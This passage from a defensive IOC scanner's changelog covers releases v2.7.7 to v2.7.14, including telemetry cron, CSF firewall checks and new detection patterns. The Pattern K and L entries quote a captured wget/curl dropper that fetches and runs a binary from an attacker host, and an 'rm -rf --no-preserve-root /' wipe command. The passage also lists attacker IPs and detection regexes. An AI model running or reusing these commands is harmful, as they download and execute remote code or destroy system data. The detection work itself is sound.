  sample rows per host (e.g. `count(ioc_sample) > 1` as a
  high-volume-attacker heuristic) must shift to the underlying
  `ioc_scan` count field (`hits_2xx`, `count`, `unique_src_ips`),
  which carries the authoritative tally without the per-row
  expansion.

### Rationale
This release prioritizes deterministic CLEAN/COMPROMISED separation
over evidence-rich SUSPICIOUS bins. The pre-v2.7.14 noise floor was
making fleet-rollup spreadsheets unreadable: 7K SUSPICIOUS hosts
where ~500 were genuinely worth review, and records.jsonl was 60%+
diagnostic samples by row count. Strong-tier verdict math is
deliberately untouched — every flip lands on signals the emitter
already documents as benign or attempt-only.

## sessionscribe-ioc-scan.sh v2.7.13 — 2026-05-04

### Changed
- **Demote `alg_length_optrec_bug` from `bug`-kind to `marker`-kind.**
  Fleet observation across the records.jsonl pipeline showed this as the
  single most-firing signal — every host on tiers 110/118/126/132 carries
  the unfixed OIDC operator-precedence bug, and that's most of the fleet.
  The bug is real (`if !length $algorithm > 2` parses as
  `(!length $algorithm) > 2`, always false) but it's a **pre-existing
  post-auth defense-in-depth issue, NOT the SessionScribe primitive**.
  Per the EXPLAIN string in STATIC_EXPLAINS[0]: "fixed on the 134-line
  and not backported to 110/118/126/132. Resolves on tier upgrade."

  Net impact on signal shape:

  | Tier        | Pre-v2.7.13                                   | Post-v2.7.13                              |
  |-------------|------------------------------------------------|-------------------------------------------|
  | 110-132     | `severity=advisory key=ancillary_bug_unpatched` | `severity=info key=patch_marker_absent`  |
  | 134+        | `severity=info key=ancillary_bug_fixed`        | `severity=info key=patch_marker_present` |
  | both forms  | `severity=warning key=pattern_both`           | `severity=info key=patch_marker_present` |
  | neither     | `severity=warning key=pattern_neither`        | `severity=info key=patch_marker_absent`  |

  Per-host detection is preserved (queryable via
  `area==static && id==alg_length_optrec_bug` in records.jsonl), just
  reclassified from advisory-tier to info-tier. The host's
  `code_verdict` and `host_verdict` are unaffected (advisory-tier
  signals don't move either axis), but `summary.advisories` count drops
  by ~1 per legacy-tier host across the fleet — fleet-rollup
  spreadsheets pivoting on advisory_count will show the corresponding
  decrease.

  **Downstream consumer note for forge `records.jsonl` queries:** any
  filter on `severity=="advisory"` for `alg_length_optrec_bug` should
  switch to `severity=="info"`. Filters on `key=="ancillary_bug_*"`
  for this entry should switch to `key=="patch_marker_*"`. The rich
  EXPLAIN string ("operator-precedence trap...") still accompanies the
  marker-present case via the `note` field; the marker-absent case
  carries the generic "Marker not present (older Perl line; expected
  on 110/118/126/132 backport tiers)" note since the marker emit path
  uses the existing hardcoded message — operators wanting the bug
  detail can grep STATIC_EXPLAINS in the script source or filter on
  the static_id.

  **Twin entry left untouched:** `start_authorize_in_die` (STATIC_IDS
  index 1) is the same shape (same OIDC file, same "fixed on 134-line
  and not backported" story) and would benefit from the same demotion
  if fleet data shows the same noise profile. Not flipped in this
  release pending operator confirmation that it's similarly noisy.

## sessionscribe-ioc-scan.sh v2.7.12 — 2026-05-03

### Security
- **Tighten `/etc/cron.d/sessionscribe-telemetry` perms 0644 → 0600.**
  The v2.7.11 install used the cron.d-conventional 0644 (root rw,
  world-readable), but our generated cron line embeds the
  `--upload-token` value verbatim when one is passed at install time.
  World-readable + embedded credential meant any local user on the
  host could read the intake token via `cat /etc/cron.d/sessionscribe-
  telemetry`. cronie / vixie-cron read `/etc/cron.d/*` as root and
  don't require world-readability — verified on Fedora 40 (cronie):
  0600 entries are picked up by crond normally with no
  `BAD FILE MODE` rejection in the journal.

  Mode uniformity: 0600 unconditionally (even without an embedded
  token) so operator audit is trivial — every cron file we install
  has the same restrictive perms regardless of whether the operator
  passed a custom token. The file's other contents (script path,
  schedule, --upload-url) aren't credential-grade but the uniform
  policy is easier to reason about than "0644 normally / 0600 when
  embedding token".

  Operator inspection: `sudo cat /etc/cron.d/sessionscribe-telemetry`
  (root needed; previously any user).

  Pre-existing token-in-`ps` exposure during the `curl -T -H
  X-Upload-Token: ...` PUT remains unchanged — that's the existing
  intake-system curl invocation and the user explicitly scoped this
  pass to NOT touch phase_upload. Operators concerned about argv-
  exposure of the token should use `--upload-token-file` (not
  implemented; would be a follow-up if needed).

## sessionscribe-ioc-scan.sh v2.7.11 — 2026-05-03

### Added
- **`--telemetry-cron <add|remove> [INTERVAL]`** — install or remove a
  system cron entry that runs the telemetry path (`--telemetry
  --chain-on-all --chain-upload --quiet --jsonl >/dev/null 2>&1`) on a
  fixed interval. Generated cron prepends a 5s-180s random-sleep
  jitter so a fleet of N hosts doesn't synchronize on the minute mark
  and overwhelm the intake collector with a single burst.

  CLI surface:
  - `--telemetry-cron add` — install with default 6h interval
  - `--telemetry-cron add 1h|6h|12h|24h` — install with specified
    interval; allowlist enforced at parse time
  - `--telemetry-cron remove` — uninstall (idempotent — no-op if not
    installed)

  Pass-through of `--upload-url` and `--upload-token` if the operator
  sets them on the same command line — those values get embedded
  (single-quote-wrapped) in the generated cron entry so the scheduled
  run ships to a custom intake without manual file edits. Single-
  quotes in the values themselves are rejected at install time with
  a clear error (would break shell parsing of the cron line at run
  time).

  Cron file: `/etc/cron.d/sessionscribe-telemetry`. Reasons:
  - System cron format (works under cronie/vixie-cron/EL9 systemd-cron)
  - `SHELL=/bin/bash` declared in-file so `$((RANDOM % N))` arithmetic
    works at run time (cron's default `/bin/sh` is dash on Debian-
    derivatives; no `$RANDOM` there)
  - Inspect via `cat`, disable via `rm`; no `crontab -l | { …; } |
    crontab` race window when re-running 'add'
  - `install -m 0644 -o root -g root` for atomic replace; best-effort
    `restorecon` for SELinux context restoration

  Schedule mapping:
  | Interval | Cron expression |
  |----------|----------------|
  | 1h       | `0 * * * *`    |
  | 6h       | `0 */6 * * *`  |
  | 12h      | `0 */12 * * *` |
  | 24h      | `0 0 * * *`    |

  Jitter math: `5 + RANDOM % 176` produces a uniform integer in
  `[5, 180]` — 176 distinct values. A 1000-host fleet hitting intake
  at minute 0 distributes across ~3 minutes (~6 hosts/sec average).

  Dispatch order: cron management runs immediately after CLI parsing,
  BEFORE scan-mode validations (no `--no-ledger` / cPanel-host gate
  fires during cron mgmt). Operators don't need a live cPanel host
  to install/remove the cron entry — only root + `/etc/cron.d/`.

  Self-path resolution: `readlink -f "$0"` with `cd "$(dirname …)"`
  fallback for stripped containers without readlink. The resolved
  absolute path goes into the cron entry so the scheduled run is
  immune to the operator's cwd at install time.

  Validation:
  - Action must be `add` or `remove` (rejected at parse time)
  - Interval must be `1h|6h|12h|24h` (regex-gated at CLI; case
    statement re-validates inside the function for defense-in-depth)
  - EUID 0 required (writes /etc/cron.d/)
  - `/etc/cron.d/` must exist (cronie/vixie-cron must be installed)
  - `--upload-url` / `--upload-token` must not contain single-quote
    (would break the cron line's shell-parse at run time)

  Verification: bash -n clean, shellcheck `-S warning` clean (12
  warnings, all baseline). Live tested on this Fedora 40 host: add
  with default 6h, add with 1h/24h, add with custom upload-url +
  upload-token (correctly single-quoted), idempotent remove,
  hostile single-quote injection rejected, missing-action rejected,
  invalid-action rejected. Cron line itself executed under
  `bash -c` produced 3 distinct sleep durations (89s, 98s, 50s) all
  within [5, 180] — `$RANDOM` arithmetic works correctly via the
  in-file `SHELL=/bin/bash` declaration.

## sessionscribe-ioc-scan.sh v2.7.10 — 2026-05-03

### Added
- **`--telemetry` mode for high-frequency fleet polling.** Lite bundle that
  drops the heavy MB-scale tarballs but keeps every KB-scale forensic
  artifact, designed for `~50–100 KB` per-host disk footprint vs `~50 MB`
  for `--full` bundles.

  Lite-bundle contents (kept):
  - `manifest.txt` — host metadata
  - `ioc-scan-envelope.json` — the canonical `signals[]` envelope
  - `kill-chain.{tsv,jsonl,md}` — reconciled DEF↔IOC timeline primitives
  - `ps.txt` / `connections.txt` / `iptables.txt` — process + network
    snapshot (KB-scale)
  - `pattern-a-binary-metadata.txt` / `pattern-h-seobot-metadata.txt` /
    `pattern-i-system-service-metadata.txt` — attacker-binary stat +
    sha256 + hex-head fingerprints (binaries themselves NOT bundled,
    same safety policy as `--full`)

  Heavy-tarball contents (skipped under `--telemetry`):
  - `sessions.tgz`, `access-logs.tgz`, `system-logs.tgz`,
    `cpanel-state.tgz`, `cpanel-users.tgz`, `persistence.tgz`,
    `defense-state.tgz`, per-user bash histories

  Implies `--full --chain-on-all --bundle` so every host gets forensic
  reconciliation regardless of `host_verdict`. Compatible with `--upload`
  (ships the lite bundle to intake unchanged) and orthogonal to the new
  envelope POST below.

- **`--telemetry-url URL` envelope-only HTTP POST.** Single `Content-Type:
  application/json` POST of the envelope (NOT the bundle tarball) to a
  fleet collector. Decouples high-frequency telemetry from the existing
  `--upload` intake path so operators can split traffic: telemetry POST
  on every host (cheap), bundle upload only on `host_verdict ==
  COMPROMISED` via `--chain-on-critical --upload`.

  Three-transport fallback ladder, best-first (bash-native floor — no
  Perl, Python, or other interpreter dependency):
  1. **curl** — preferred; `--data-binary @file` avoids ARG_MAX,
     `-w '%{http_code}'` extracts status without a second call,
     `--max-time` bounds each attempt
  2. **wget** — `--post-file=`, `--server-response` for status; HTTPS
     gated on `wget --version | grep '+ssl'` so SSL-stripped wget
     binaries don't get picked for HTTPS endpoints. Captures both
     stdout + stderr (wget2 on Fedora/EL9+ writes the status line to
     stdout; classic wget 1.12 on CL6 writes it to stderr — same
     regex `^[[:space:]]*HTTP/` matches both)
  3. **bash native** — `/dev/tcp` for HTTP, `openssl s_client` for
     HTTPS. bash on RHEL/CL6+ is built `--enable-net-redirections`
     so the `/dev/tcp/<host>/<port>` pseudo-path works without any
     external HTTP client. openssl is universally present on cPanel
     hosts (cpsrvd uses libssl). The whole transaction is wrapped
     in `timeout(1)` so a hung connect or stalled read can't outlive
     `TELEMETRY_TIMEOUT`. URL parsing is done in pure bash parameter
     expansion; Host header includes `:port` only when non-default.

  Hosts with no curl/wget AND no openssl (HTTPS endpoints) emit a
  `posture`-class warning signal and the lite bundle on disk remains
  the operator's fallback for out-of-band collection. HTTP-only
  endpoints work even on a stripped container with nothing but bash.

- **Telemetry knobs:**
  - `--telemetry-token TOK` — Bearer token in `Authorization` header
  - `--telemetry-timeout N` — per-attempt HTTP timeout (default 15s)
  - `--telemetry-retry N` — retry count on transient failure (default
    2; total attempts = 1 + N). Exponential backoff: 2s after attempt
    1, 4s after attempt 2
  - `--telemetry-max-bytes B` — cap envelope size (default 5MB);
    oversize envelopes skip the POST and emit
    `telemetry_envelope_too_large`. Lite bundle on disk is unaffected

- **Telemetry signal vocabulary** (all `posture_*` discipline:
  `telemetry_*` keys, never `ioc_*`, so failures are operationally
  reportable but do NOT flip `host_verdict`):
  - `telemetry_post_complete` — info, with `http_code`, `attempt`,
    `duration_ms`, `transport`, `bytes`
  - `telemetry_post_failed` — warning, after exhausting retries; carries
    the truncated response body + last error string for triage
  - `telemetry_envelope_too_large` — warning, size-cap exceeded
  - `telemetry_envelope_empty` — warning, envelope is zero bytes
  - `telemetry_no_envelope` — warning, ENVELOPE_PATH + BUNDLE_BDIR both
    missing
  - `telemetry_no_transport` — warning, none of curl/wget/perl-LWP
    available (or no SSL-capable transport for HTTPS endpoint)

- **Validation discipline:** `--telemetry-url` must be `http://` or
  `https://` (rejects ftp/file/etc). `--telemetry-timeout >= 1`,
  `--telemetry-retry >= 0`, `--telemetry-max-bytes >= 1024`. Telemetry
  is incompatible with `--no-ledger` for the same reason `--full` is
  (the lite bundle requires the envelope on disk).

- **CL6 / bash 4.1 floor maintained:** transport probes are conditional
  (no required dependency on any one transport); `have_cmd` uses
  `command -v`; bash-native fallback requires only `bash`,
  `timeout(1)`, and (for HTTPS) `openssl(1)`. URL parsing uses pure
  parameter expansion (no awk/sed regex) so it works on the bash 4.1
  floor without surprises on busybox-shaped environments.

- **Verification:** bash -n clean, shellcheck `-S warning` clean (no
  new warnings in added range). End-to-end tested via netcat HTTP
  listener AND `openssl s_server` HTTPS listener: curl path (200 OK,
  full POST shape with User-Agent, Authorization, Content-Type,
  Content-Length verified), wget path (curl hidden via PATH override,
  wget2 stdout vs classic stderr both captured), bash `/dev/tcp` path
  (curl + wget hidden, full POST shape verified end-to-end), bash
  `openssl s_client` path (curl + wget hidden, TLS handshake completes
  against self-signed s_server, http_code parsed correctly),
  connection-refused retry+backoff, oversize envelope cap,
  empty-envelope guard. CLI validation gates exercised: ftp scheme,
  non-integer timeout, no-ledger conflict, sub-1024 max-bytes — all
  rejected with clear error messages.

  Driver: continuation of CSF-posture (v2.7.9) telemetry trajectory —
  fleet operators want to know *every* host's defensive + IOC posture
  without paying the bundle-tarball cost. records.jsonl extractor on
  forge consumes only the envelope's `signals[]` already, so this
  matches existing pipeline shape with zero downstream change.

## sessionscribe-ioc-scan.sh v2.7.9 — 2026-05-03

### Added
- **CSF firewall posture detector (`check_csf_posture`).** Validates that
  ConfigServer Firewall is installed AND actually enforcing on each fleet
  host. "Installed but not loaded" is a common silent-failure mode — the
  binary lives in PATH and the operator assumes protection while iptables
  is wide open. New `posture` section sits between `destruction` and
  `probe` in SECTION_ORDER and surfaces 12 break-modes:

    1. CSF/lfd not installed (`posture_csf_not_installed`, advisory)
    2. `/etc/csf/csf.disable` administrative kill-switch
       (`posture_csf_administratively_disabled`, advisory)
    3. csf.conf missing while binary present
       (`posture_csf_conf_missing`, warning)
    4. `TESTING="1"` flag (`posture_csf_testing_mode`, warning)
    5. lfd daemon dead (`posture_csf_lfd_not_running`, warning)
    6. iptables binary missing (`posture_csf_iptables_missing`, warning)
    7. `csf -v` self-test fails (`posture_csf_binary_self_test_fail`,
       warning)
    8. CSF terminal chains absent in iptables — LOCALINPUT/LOCALOUTPUT/
       LOGDROPIN (`posture_csf_chains_absent`, warning; bumps to
       `posture_csf_firewall_open` evidence-tier when INPUT policy is
       also ACCEPT — firewall effectively off)
    9. INPUT chain does not jump to LOCALINPUT — orphaned chains
       (`posture_csf_chains_orphaned`, warning)
   10. LOCALINPUT exists with INPUT jump but zero rules — interrupted
       `csf -r` (`posture_csf_chains_empty`, warning)
   11. `LF_IPSET="1"` promised but ipset binary missing or no sets
       loaded (`posture_csf_ipset_binary_missing` /
       `posture_csf_ipset_no_sets`, warning)
   12. Healthy roll-up — all hard probes pass
       (`posture_csf_active`, info, OK-tier in matrix). Records
       `localin_rules`, `lfd_pid`, `csf_version`, `input_policy`,
       `lf_ipset`, `ipset_sets` so fleet aggregators get a positive
       per-host green status.

  Severity discipline: posture findings use the `posture_` key prefix
  (never `ioc_`) so they surface in the section matrix and JSON envelope
  without flipping host_verdict to SUSPICIOUS/COMPROMISED — the IOC
  engine is reserved for attacker-evidence rows. Posture is defensive
  degradation, not exploitation.

  Snapshot-aware: `--root` mode emits a single `posture_csf_snapshot_skip`
  info row and bypasses live iptables/lfd probes.

  lfd liveness probe is robust 3-stage: pidfile + `/proc/<pid>/comm`
  verification (defends against stale-pid reuse), then pidof, then
  pgrep fallback. Accepts both `lfd` (EL7+) and `perl` (EL6 lfd.pl)
  comm strings.

  CL6 / bash 4.1 floor verified: every local initialized, no `[[ -v ]]`,
  no namerefs, `iptables -n` (no DNS lookups against firewalled
  resolvers), `iptables -S` for jump enumeration over `-nL` parsing.

  Driver: fleet-wide validation of CSF integrity following
  IC-5790 / SessionScribe response — operators need to know which
  hosts have intact firewalls vs broken-state hosts where defensive
  posture has silently degraded.

## sessionscribe-ioc-scan.sh v2.7.8 — 2026-05-03

### Added
- **Pattern K — Cloudflare-fronted /Update second-stage backdoor.**
  Surfaced by Colin Clare on host.imagicktest 2026-05-03 16:28 CDT and
  independently captured in Vishnu Narayanan's 2026-05-01 03:59 CDT
  single-host kill-chain dump. Distinct from Pattern C (different
  infrastructure, different fetch logic) and represents a more capable
  second-stage backdoor than the Mirai/nuclear.x86 drop. Runs after the
  harvester (Pattern F) completes — same actor toolchain. Captured
  dropper shape:

      F=/tmp/.u$$; (wget -q -O "$F" 'https://cp.dene.de.com/Update' \
        || curl -sk -o "$F" 'https://cp.dene.de.com/Update') \
        && chmod 755 "$F" && "$F" -s; rm -f "$F"

  Two IOCs scanned in shell history (HISTORY_FILES_GLOB), both routed
  through `_classify_history_match` so responder `grep cp.dene` /
  `history|grep cp.dene.de.com` etc. don't FP into strong-tier:
  - **K1: PATTERN_K_BACKDOOR_HOST literal `cp.dene.de.com`**
    - hostile (download/exec verb adjacent) → `ioc_pattern_k_backdoor_fetch`
      (`ioc_pattern_k_backdoor_host_referenced`) strong/8 with
      hostile/diagnostic/unknown line counts and `corroborated_by`
      field flagging K2 if also seen
    - unknown shape (e.g. `echo cp.dene.de.com >> notes`) →
      `ioc_pattern_k_backdoor_review` (`ioc_pattern_k_backdoor_host_review`)
      warning/4
    - diagnostic only → `ioc_pattern_k_backdoor_diagnostic`
      (`ioc_pattern_k_backdoor_diagnostic_only`) info/0
  - **K2: PATTERN_K_TMP_RE shape `F=/tmp/\.u([$][$]|[0-9]+)`** —
    paranoid PID-tagged hidden temp-file pattern. The literal `$$`
    form (as typed in bash_history) and the `[0-9]+` form (echo-
    constructed expansion) are both matched via portable `[$][$]`
    character class. Standalone emit only when K1 did NOT also fire
    (otherwise K1 captures it as corroboration field):
    `ioc_pattern_k_tmpfile_paranoid` (`ioc_pattern_k_pid_tempfile_shape`)
    warning/3 - shape alone has FP risk in legitimate sysadmin one-liners.

  Network-control caveat preserved per dossier: `cp.dene.de.com` is
  Cloudflare-fronted shared anycast; do NOT blackhole at edge. The
  emit's `note` field flags this and recommends Cloudflare T&S
  coordination for zone takedown.

- **Pattern L — filesystem-nuke (`rm -rf --no-preserve-root /`).**
  Surfaced in Vishnu's 2026-05-01 capture; Nicholas Welch's 2026-05-03
  fleet (host 57178T + 13 others "command not found" / "Killed by
  signal 9 / timeout") flagged as candidate cohort. The no-ransom,
  no-extortion, scorched-earth destruction variant — same kill-chain
  as Patterns A/B/C/H, attacker-selectable terminal payload. Captured
  shape (wrapped in `__CMD_START__/__CMD_END__` envelope, different
  from Pattern F's `__S_MARK__/__E_MARK__` recon envelope):

      printf '__CMD_START__'; /bin/bash -c \
        'rm -rf --no-preserve-root / &disown' 2>&1; printf '__CMD_END__'

  - **L1: PATTERN_L_NUKE_RE** primary signal
    (`rm[[:space:]]+-rf[[:space:]]+--no-preserve-root[[:space:]]+/`),
    classified via `_classify_history_match`:
    - hostile → `ioc_pattern_l_filesystem_nuke`
      (`ioc_pattern_l_no_preserve_root_rm`) strong/10 — REIMAGE-only
      destruction
    - unknown → `ioc_pattern_l_filesystem_nuke_review`
      (`ioc_pattern_l_no_preserve_root_review`) warning/4
    - diagnostic only → `ioc_pattern_l_filesystem_nuke_diagnostic`
      (`ioc_pattern_l_no_preserve_root_diagnostic_only`) info/0
  - **L2: PATTERN_L_CMD_START / PATTERN_L_CMD_END** envelope
    corroborator (`__CMD_START__`/`__CMD_END__`). When found alongside
    L1, L1's emit carries the `corroborated_by` field. When found
    standalone (no nuke command itself, e.g. command rotated out of
    history), `ioc_pattern_l_cmd_envelope`
    (`ioc_pattern_l_destructive_cmd_envelope`) warning/4 — destructive-
    class harvester ran, manual review.

  Note: live filesystem on a successful Pattern L hit is empty; the
  primary detection scenario is forensic against an Acronis backup
  mounted as `--root`. Snapshot-mode (`ROOT_OVERRIDE`) currently runs
  Pattern J only — extending K/L to snapshot mode requires
  ROOT_OVERRIDE-aware HISTORY_FILES_GLOB and is queued for the next
  release.

- **Pattern F additional marker — `__CMD_DONE_<nanosec_epoch>__`.**
  Same actor toolchain (rev5 dossier; observed on Vishnu's host
  `__CMD_DONE_1777517985331303156__` and imagicktest
  `__CMD_DONE_1777518004367598800__`). PATTERN_F_CMD_DONE_RE
  (`__CMD_DONE_[0-9]+__`) routed through `_classify_history_match`
  regex mode. Three tiers parallel to the existing __S_MARK__ shapes:
  - hostile → `ioc_pattern_f_cmd_done`
    (`ioc_pattern_f_cmd_done_marker`) strong/8 (slightly lower than
    __S_MARK__'s strong/10 — single marker is a weaker signal than the
    full envelope alone)
  - unknown → `ioc_pattern_f_cmd_done_review` warning/3
  - diagnostic only → `ioc_pattern_f_cmd_done_diagnostic` info/0

- **Pattern G lsyncd-amplification corroboration.** When Pattern G
  fires (any of the 3 Pattern G branches: forged-mtime+IP-labeled
  strong, IP-labeled-only review, oddpath-keys review) AND the host
  has lsyncd evidence (process via `pgrep -x lsyncd`, or
  `/etc/lsyncd/` config dir, or `/etc/lsyncd*.conf` /
  `/etc/lsyncd*.lua` config file via `compgen -G`), emit
  `ioc_pattern_g_lsyncd_amplification`
  (`ioc_pattern_g_lsyncd_cluster_blast_radius`) warning/4 with an
  `evidence` field pointing to which detector fired. Per Norman Dumond
  2026-05-03 10:39 dossier: lsyncd master compromise = automatic
  compromise of every replica via the cluster's legitimate replication
  keypair. The amplification emit doesn't escalate THIS host's verdict
  (Pattern G already did) but surfaces blast-radius for remediation —
  revoke + reissue the cluster's keypair, not just this host's.

- **Pattern C second binary host `87.121.84.243`.** rev5 addition (Rahul
  Krishnan, 2026-05-03 case 46501374, host.eworksinc.com). Same /24 as
  the original `87.121.84.78`, same actor scaling infrastructure.
  Multiple active nuclear.x86 processes still running as root —
  confirms Pattern C can run in active-process mode in addition to the
  originally-documented hit-and-run. Added as `PATTERN_C_C2_IP_2` and
  OR'd into both the bash_history C2-reference scan and the
  cron/profile.d persistence-path scan.

- **`fmt_offense_detail` routing for Patterns K, L.** Added
  `(ioc_pattern_k_*) → echo K` and `(ioc_pattern_l_*) → echo L` to the
  area-letter mapping at line ~1346.

- **`ATTACKER_IPS[]` rev5 additions.** `87.121.84.243` (Pattern C
  variant - second binary host); `67.205.166.246` (badpass exploit,
  Jamie 2026-05-03 08:02 null-routed; source
  cloudvpstemplate.1g9j3u-lwsites.com).

### Fixed
- **`_classify_history_match` exec_verb_re extension: path-prefixed
  shell forms.** Sentinel-driven fix surfaced during Pattern L fixture
  run. The captured Pattern L shape is `/bin/bash -c 'rm -rf
  --no-preserve-root / &disown'` — but the helper's `exec_verb_re`
  only recognized the bareword forms (`source|eval|exec|bash|sh`). The
  `/bin/bash` path-prefix form was preceded by `/`, not in the
  word-boundary set `(^|[[:space:]]|;|&)`, so the line classified as
  unknown (review tier) instead of hostile (strong tier). Extended the
  alternation to also recognize `/bin/sh`, `/bin/bash`, `/usr/bin/sh`,
  `/usr/bin/bash`. Negative regression check: paths containing `bash`
  as substring (e.g. `/opt/bashlike/runner`) are NOT matched (the
  word-boundary preceding still requires start/space/`;`/`&`, and the
  shell-name alternation enumerates only the legit shell paths).
  Affects all callers of `_classify_history_match` (Patterns C, F,
  H2, K, L) — defensive widening with no FP regression risk per
  fixture trace.

- **K2/L2 standalone-emit gate now reads K1/L1 emit tier, not file
  presence.** Sentinel SHOULD-FIX (rdf-reviewer 4-pass on v2.7.8).
  Previous gate `(( ${#_k2_files[@]} > 0 && ${#_k1_files[@]} == 0 ))`
  silently swallowed K2/L2 hostile signals when K1/L1 fired
  diagnostic-only (e.g., responder `grep cp.dene` lands in one
  history file while a real `F=/tmp/.u$$` dropper in another file
  goes uncaptured because `_k1_files` was non-empty). Rewritten to
  track `_k1_emit_real` / `_l1_emit_real` flags set inside the
  strong-OR-warning emit branches; gate the standalone K2/L2 emits
  on `_k1_emit_real == 0` / `_l1_emit_real == 0`. Diagnostic-only K1/L1
  no longer suppresses corroborating shape evidence.

### Verification
- bash -n + shellcheck -S warning pass (only pre-existing warnings;
  none in new K/L/F-CD/G-lsyncd code).
- gawk 3.x floor preserved (no `{n}` intervals, no 3-arg `match`,
  ENVIRON-passed needles).
- bash 4.1 / set -u / EL6 floor preserved (`compgen -G` for lsyncd
  config glob is bash 4.0+; `pgrep -x` is procps-ng 3.2+ which
  predates EL6's procps-ng 3.2.8).
- Acceptance fixture suite (`/tmp/ioc-scan-fixture-test.sh`): 52/52
  pass covering Pattern F (6), Pattern C regression (2), Pattern H2
  (12), Pattern A (7), Pattern K (7 — dropper one-liner /
  responder-grep-FP / cat-grep-FP / echo-unknown / regex K2 shape
  positive+negative cases), Pattern L (4 — bare nuke / bash -c
  wrapped / responder-grep-FP / history-grep-FP), Pattern F __CMD_DONE
  (4 — bare hostile / responder grep / regex positive numeric / regex
  negative non-numeric), exec_verb_re extension (5 — /bin/bash,
  /usr/bin/bash, /bin/sh, /usr/bin/sh + negative /opt/bashlike).

### Known gaps (queued for next release)
- **Snapshot-mode K/L coverage.** The most useful Pattern L scenario
  (forensic against Acronis backup of nuked host) is currently outside
  snapshot-mode's scope. Requires ROOT_OVERRIDE-prepending the
  HISTORY_FILES_GLOB across Patterns C/F/H/K/L; deferred to keep this
  release's scope tight.
- **Pattern D recon-stage detection.** Currently detects persistence
  stage (sptadm in accounting.log + WHM_FullRoot token). The recon
  sequence (`/json-api/{version,gethostname,listaccts,getdiskusage,
  systemloadavg,getips}` from Go-http-client/1.1 against cpsrvd
  ports) is documented but not detected — would require log-walk
  with time-window aggregation.
- **Pattern J object-key string IOC.** The OVH bucket
  `s3-screenshots.s3.eu-west-par.io.cloud.ovh.net` is IR-team
  transport infra (do NOT blocklist - prior-session memory) but the
  attacker-specific object key `/G7t7gnXGGms6Ki6AW9lte6WkQ` could be
  searched in cron/at-jobs/systemd-units as a string IOC. Judgment
  call deferred.

## sessionscribe-ioc-scan.sh v2.7.7 — 2026-05-03

### Fixed
- **Diagnostic-shape FP filter parity for Patterns F, H2, H3, A.** v2.7.5
  shipped the diagnostic-shape classifier for Pattern C
  (`ioc_pattern_c_nuke_trace_diagnostic`), but the same FP class was still
  unfixed for the other history-string and README-content primitives.
  Discovered live on `host.imagejax.com` (64.91.237.146) on 2026-05-03 22:15
  UTC: under v2.7.5 the host returned CLEAN for Pattern C (the new filter
  caught the `history | grep nuclear.x86` line) but Patterns F, H, A still
  carried unguarded literal-grep emits that would have flipped a responder-
  checked host to COMPROMISED on the next scan.

  - **Helper hoist.** v2.7.5's inline awk classifier is now a script-level
    helper `_classify_history_match <regex|literal> <needle> <files...>`,
    returning `h=N d=N u=N fhe=EPOCH file_h=PATH` for any caller. Pattern C
    refactored to call the helper with `regex 'nuclear\.x86'` (semantics
    preserved; a small accuracy fix lands at the same time - `mtime_epoch`
    on the strong-tier emit now stat()s the actual hostile-shape file
    rather than the first matched file, so `mtime_epoch` and `sample_path`
    refer to the same artifact).

  - **Pattern F (`__S_MARK__` harvester envelope).** Previously emitted
    `ioc_pattern_f_harvester` strong/10 unconditionally on any literal
    match in `${HISTORY_FILES_GLOB[@]}`. FP shape:
    `grep __S_MARK__ /root/.bash_history` (responder check) → string lands
    in history → next scan fires strong/COMPROMISED. Now classified per
    line via the shared helper:
    - hostile shape → `ioc_pattern_f_harvester` strong/10 (unchanged
      offense_id; new `hostile_lines`/`diagnostic_lines`/`unknown_lines`
      classifier-count fields; `ts_epoch_first` now reflects FIRST
      hostile-shape match, not first occurrence, so diag-shape lines do
      not pollute kill-chain reconstruction)
    - unknown shape → new `ioc_pattern_f_review_undetermined`
      (`ioc_pattern_f_smark_review`) warning/5
    - diagnostic-only → new `ioc_pattern_f_diagnostic_only`
      (`ioc_pattern_f_smark_diagnostic_only`) info/0

  - **Pattern H2 (`pkill -9 nuclear.x86 kswapd01 xmrig` kill prelude).**
    The diag_re shape filter does NOT apply: `pkill` is a destructive verb
    on both attacker and responder paths, so the same line is the
    competitor-kill prelude (followed by an install primitive) OR a
    responder cleanup (followed by `ps -ef | grep -v grep` to verify the
    kill took). New helper `_classify_kill_prelude_context <file> <re>
    <ctx_lines>` (default ctx=3) classifies by *adjacency*:
    - hostile if any of the next 3 command lines matches an install
      primitive (`wget|curl|fetch|lwp-download|tftp|base64 -d|chmod
      +x|<octal>|bash <(|./seobot`) → `ioc_pattern_h_kill_prelude`
      strong/8 (offense_id unchanged; new classifier-count + adjacency
      semantics)
    - diagnostic if a defensive verify (`ps|pgrep|echo done|exit|true`)
      or empty line appears within ctx → new
      `ioc_pattern_h_kill_prelude_diagnostic`
      (`ioc_pattern_h_competitor_kill_diagnostic_only`) info/0
    - unknown (isolated kill, no clear adjacency on either side) → new
      `ioc_pattern_h_kill_prelude_review`
      (`ioc_pattern_h_competitor_kill_review`) warning/4

  - **Pattern H3 (`ALLDONE` end marker).** Previously emitted
    `ioc_pattern_h_alldone` warning/5 unconditionally on any literal
    `ALLDONE` substring match. The code comment on the block already
    called out the shape: *"warning-tier - generic enough to FP, useful
    only alongside H1/H2/H4."* But the implementation did not enforce the
    gate. Now suppressed entirely unless corroborated by H1
    (`seobot.php` on disk), H2-hostile (kill-prelude in hostile shape),
    or H4 (`/tmp/seobot.zip` magic match). When corroborated, the emit
    carries a new `corroborated_by` field listing which signals fired.
    H3 emit moved to AFTER H4 in the source; H1/H2/H4 set local boolean
    flags read by the H3 gate.

  - **Pattern A (qTox ransom README).** Previously emitted
    `ioc_pattern_a_readme` strong/10 on any file containing `qtox`,
    `TOX ID`, `Sorry-ID`, or the literal `PATTERN_A_TOX_ID` hash. FP
    shape: responder IR notes (`/root/IR-notes-IC-5790.md`,
    `/root/notes-2026-05-02.txt`, `/root/runbooks/`, `/root/.claude/`
    Claude Code working copies) routinely carry the dossier TOX_ID as
    documentation. Added content/path-shape filter:
    - **Documentation-shape allowlist** (path matches
      `^/root/(IR|notes|runbooks|\.claude|\.cache)/|IR-notes|runbook|notes-[0-9]`)
      OR **file >200 lines** → new `ioc_pattern_a_readme_documentation`
      (`ioc_pattern_a_ransom_readme_documentation`) info/0 with new
      `line_count` field
    - **Exact TOX_ID hash + short file outside allowlist** →
      `ioc_pattern_a_readme` strong/10 (offense_id unchanged; canonical
      drop)
    - **qtox/Sorry-ID strings without exact TOX_ID hash + short file
      outside allowlist** → new `ioc_pattern_a_readme_review`
      (`ioc_pattern_a_ransom_readme_review`) warning/5

  All new offense_ids share the existing `ioc_pattern_<letter>_*` prefix
  scheme so the area-tag mapping at `fmt_offense_detail()` (`ioc_pattern_a_*
